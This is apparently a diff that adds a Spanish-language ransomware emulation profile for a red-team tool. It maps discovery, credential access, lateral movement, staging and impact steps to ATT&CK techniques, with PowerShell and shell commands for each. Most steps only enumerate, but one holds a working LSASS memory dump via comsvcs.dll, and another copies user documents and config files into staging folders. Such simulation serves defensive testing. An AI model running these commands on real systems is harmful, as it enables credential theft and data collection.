@@ -1,0 +1,91 @@
+{
+  "name": "Simulación de Ransomware",
+  "description": "Simula la cadena completa de un ataque de ransomware: descubrimiento, acceso a credenciales, movimiento lateral e impacto.",
+  "tags": ["ransomware", "simulation", "impact"],
+  "abilities": [
+    {
+      "name": "Descubrimiento de Información del Sistema",
+      "tactic": "discovery",
+      "technique_id": "T1082",
+      "technique_name": "System Information Discovery",
+      "description": "Recopila información básica del sistema operativo y hardware.",
+      "platforms": {
+        "windows": {
+          "psh": "systeminfo; Get-ComputerInfo | Select-Object OsName, OsVersion, CsName"
+        },
+        "linux": {
+          "sh": "uname -a; cat /etc/os-release; hostname"
+        }
+      }
+    },
+    {
+      "name": "Descubrimiento de Recursos Compartidos",
+      "tactic": "discovery",
+      "technique_id": "T1135",
+      "technique_name": "Network Share Discovery",
+      "description": "Enumera recursos compartidos de red disponibles.",
+      "platforms": {
+        "windows": {
+          "psh": "Get-SmbShare | Select-Object Name, Path, Description; net share"
+        },
+        "linux": {
+          "sh": "smbclient -L localhost -N 2>/dev/null; showmount -e localhost 2>/dev/null; df -h | grep -i nfs"
+        }
+      }
+    },
+    {
+      "name": "Volcado de Credenciales via comsvcs.dll",
+      "tactic": "credential-access",
+      "technique_id": "T1003.001",
+      "technique_name": "OS Credential Dumping: LSASS Memory",
+      "description": "Intenta volcar credenciales desde la memoria del proceso LSASS usando comsvcs.dll.",
+      "platforms": {
+        "windows": {
+          "psh": "$p = Get-Process lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $p.Id $env:TEMP\\lsass.dmp full"
+        }
+      }
+    },
+    {
+      "name": "Movimiento Lateral via WinRM",
+      "tactic": "lateral-movement",
+      "technique_id": "T1021.006",
+      "technique_name": "Remote Services: Windows Remote Management",
+      "description": "Establece sesión remota via WinRM para movimiento lateral.",
+      "platforms": {
+        "windows": {
+          "psh": "Test-WSMan -ComputerName localhost; Get-Service WinRM | Select-Object Status, Name"
+        }
+      }
+    },
+    {
+      "name": "Staging de Datos Local",
+      "tactic": "collection",
+      "technique_id": "T1074.001",
+      "technique_name": "Data Staged: Local Data Staging",
+      "description": "Recopila y prepara datos en un directorio temporal antes de la exfiltración.",
+      "platforms": {
+        "windows": {
+          "psh": "New-Item -ItemType Directory -Force -Path $env:TEMP\\staged; Get-ChildItem $env:USERPROFILE\\Documents -Filter *.docx -Recurse | Select-Object -First 5 | Copy-Item -Destination $env:TEMP\\staged"
+        },
+        "linux": {
+          "sh": "mkdir -p /tmp/staged; find /home -name '*.conf' -type f 2>/dev/null | head -5 | xargs -I{} cp {} /tmp/staged/"
+        }
+      }
+    },
+    {
+      "name": "Detención de Servicios de Backup",
+      "tactic": "impact",
+      "technique_id": "T1489",
+      "technique_name": "Service Stop",
+      "description": "Identifica y reporta servicios de backup activos (simulación sin detener).",
+      "platforms": {
+        "windows": {
+          "psh": "Get-Service -Name 'wbengine','VSS','SDRSVC','swprv' -ErrorAction SilentlyContinue | Select-Object Name, Status, DisplayName"
+        },
+        "linux": {
+          "sh": "systemctl list-units --type=service --state=running | grep -iE 'backup|rsync|bacula|borg'"
+        }
+      }
+    }
+  ]
+}
